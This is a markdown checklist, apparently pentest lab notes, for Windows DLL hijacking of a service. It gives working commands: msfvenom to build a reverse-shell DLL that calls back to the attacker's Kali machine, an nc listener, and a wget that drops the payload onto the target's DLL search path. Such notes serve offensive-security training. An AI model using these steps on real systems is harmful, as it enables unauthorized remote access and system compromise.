
- [ ] Transfer the binary file from Target Machine to your Kali Machine

- [ ] Create a service on your Windows Analysis Machine
```powershell
sc.exe create "SuperTimer" binpath= "C:\Users\hentaisalesman\Desktop\Scheduler\SuperTimer.exe"
```

- [ ] Use Process Monitor and filter for service on your Windows Analysis Machine
```
https://learn.microsoft.com/en-us/sysinternals/downloads/procmon
```

- [ ] Start service on your Windows Analysis Machine
```powershell
net start "SuperTimer"
```

- [ ] Create Windows DLL with a reverse TCP shell payload to your Kali Machine
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.xxx.xxx LPORT=6969 -f dll -o myrevshell.dll
```

- [ ] View the Windows DLL search order on the Target Machine 
```powershell
$env:path
```

- [ ] Start netcat reverse shell listener on your Kali Machine
```
nc -nlvp 6969
```

- [ ] Transfer Windows DLL payload in the Windows DLL search order on the Target Machine
```
wget http://192.168.xxx.xxx:80/myrevshell.dll -Outfile somefilename.dll
```

- [ ] Catch reverse shell on your Kali Machine